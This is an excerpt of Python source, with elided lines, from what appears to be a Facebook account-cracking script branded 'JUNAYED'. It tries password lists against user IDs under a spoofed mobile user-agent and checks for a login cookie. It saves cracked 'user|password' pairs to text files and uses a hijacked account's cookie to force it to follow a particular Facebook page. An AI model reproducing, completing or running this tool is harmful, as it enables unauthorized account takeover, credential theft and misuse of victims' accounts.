...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[JUNAYED] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JUNAYED-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JUNAYED_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JUNAYED-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JUNAYED_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/J494YE8.OFFICIAL', cookies={'cookie': coki}).text, 'html.parser')
